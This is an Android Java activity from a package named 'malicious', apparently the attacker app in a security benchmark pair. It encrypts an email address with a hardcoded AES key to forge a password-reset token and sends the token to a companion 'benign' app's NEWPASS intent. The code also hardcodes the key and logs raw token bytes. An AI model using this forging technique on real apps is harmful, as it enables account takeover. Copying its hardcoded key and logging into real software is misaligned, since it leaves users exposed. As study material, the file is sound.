package edu.ksu.cs.malicious;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends AppCompatActivity {

    private static String TAG = "Malicious";
    private static String IV;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onResume(){
        super.onResume();
        final EditText tokenW = (EditText) findViewById(R.id.editText);
        final String key = "0123456789!@#$%^";
        final String t = getToken("anniemaes@gmail.com", key);
        tokenW.setText(t);
        final Button button = (Button) findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //decrypt(t, key, IV);
                Intent intent = new Intent("edu.ksu.cs.benign.NEWPASS");
                intent.putExtra("token",t);
                intent.putExtra("IV",IV);
                startActivity(intent);
            }
        });
    }

    private String getToken(String phone, String key){
        if(phone != null && !phone.equals("")){
            try{
                Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(),"AES");
                cipher.init(Cipher.ENCRYPT_MODE,secretKeySpec);
                IV = Base64.encodeToString(cipher.getIV(),Base64.DEFAULT);
                System.out.println("------ displaying raw token");
                byte[] e = cipher.doFinal(phone.getBytes());
                for(int i=0;i<e.length;i++){
                    System.out.println(e[i]);
                }
                return Base64.encodeToString(cipher.doFinal(phone.getBytes()),Base64.DEFAULT);
                //return String.format("%040x",new BigInteger(1,cipher.doFinal(phone.getBytes())));
            }
            catch(NoSuchPaddingException e){
                Log.d(TAG, "No Such Padding Exception occurred while creating token");
                e.printStackTrace();
            }
            catch(NoSuchAlgorithmException e){
                Log.d(TAG, "No Such Algorithm Exception occurred while creating token");
                e.printStackTrace();
            }
            catch(InvalidKeyException e){
                Log.d(TAG,"Invalid Key Exception occurred while creating token");
                e.printStackTrace();
            }
            catch(IllegalBlockSizeException e){
                Log.d(TAG,"Illegal Block sixe exception occurred while creating token");
                e.printStackTrace();
            }
            catch(BadPaddingException e){
                Log.d(TAG, "Bad Padding Exception occurred while creating token");
                e.printStackTrace();
            }
        }
        return null;
    }
}
